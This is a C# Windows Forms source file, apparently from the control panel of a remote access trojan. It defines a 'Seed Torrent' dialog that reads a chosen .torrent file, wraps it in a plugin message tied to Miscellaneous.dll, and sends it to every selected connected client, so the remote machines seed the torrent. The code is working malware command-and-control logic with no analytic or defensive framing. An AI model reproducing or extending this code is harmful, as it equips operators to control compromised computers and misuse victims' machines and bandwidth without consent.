using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Server.Algorithm;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms;

public class FormTorrent : Form
{
	private bool IsOk;

	private IContainer components;

	private Label label1;

	private TextBox textBox1;

	private Button button1;

	private Button button2;

	private Button button3;

	private ToolTip toolTip1;

	public FormTorrent()
	{
		InitializeComponent();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "(*.torrent)|*.torrent";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			textBox1.Text = openFileDialog.FileName;
			IsOk = true;
		}
		else
		{
			textBox1.Text = "";
			IsOk = false;
		}
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		try
		{
			if (!IsOk)
			{
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "torrent";
			msgPack.ForcePathObject("Option").AsString = "seed";
			msgPack.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(textBox1.Text));
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Packet").AsString = "plugin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miscellaneous.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			foreach (ListViewItem selectedItem in Program.form1.listView1.SelectedItems)
			{
				ThreadPool.QueueUserWorkItem(((Clients)selectedItem.Tag).Send, msgPack2.Encode2Bytes());
			}
			Close();
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormTorrent));
		this.label1 = new System.Windows.Forms.Label();
		this.textBox1 = new System.Windows.Forms.TextBox();
		this.button1 = new System.Windows.Forms.Button();
		this.button2 = new System.Windows.Forms.Button();
		this.button3 = new System.Windows.Forms.Button();
		this.toolTip1 = new System.Windows.Forms.ToolTip(this.components);
		base.SuspendLayout();
		this.label1.AutoSize = true;
		this.label1.Location = new System.Drawing.Point(12, 18);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(129, 20);
		this.label1.TabIndex = 0;
		this.label1.Text = "Select torrent file";
		this.textBox1.Location = new System.Drawing.Point(13, 56);
		this.textBox1.Name = "textBox1";
		this.textBox1.Size = new System.Drawing.Size(460, 26);
		this.textBox1.TabIndex = 1;
		this.button1.Location = new System.Drawing.Point(518, 50);
		this.button1.Name = "button1";
		this.button1.Size = new System.Drawing.Size(84, 38);
		this.button1.TabIndex = 2;
		this.button1.Text = "Browse";
		this.button1.UseVisualStyleBackColor = true;
		this.button1.Click += new System.EventHandler(Button1_Click);
		this.button2.Location = new System.Drawing.Point(12, 98);
		this.button2.Name = "button2";
		this.button2.Size = new System.Drawing.Size(84, 38);
		this.button2.TabIndex = 3;
		this.button2.Text = "Send";
		this.button2.UseVisualStyleBackColor = true;
		this.button2.Click += new System.EventHandler(Button2_Click);
		this.button3.Location = new System.Drawing.Point(141, 98);
		this.button3.Name = "button3";
		this.button3.Size = new System.Drawing.Size(84, 38);
		this.button3.TabIndex = 4;
		this.button3.Text = "Cancel";
		this.button3.UseVisualStyleBackColor = true;
		this.button3.Click += new System.EventHandler(Button3_Click);
		base.AutoScaleDimensions = new System.Drawing.SizeF(9f, 20f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(614, 148);
		base.Controls.Add(this.button3);
		base.Controls.Add(this.button2);
		base.Controls.Add(this.button1);
		base.Controls.Add(this.textBox1);
		base.Controls.Add(this.label1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "FormTorrent";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
		this.Text = "Seed Torrent";
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
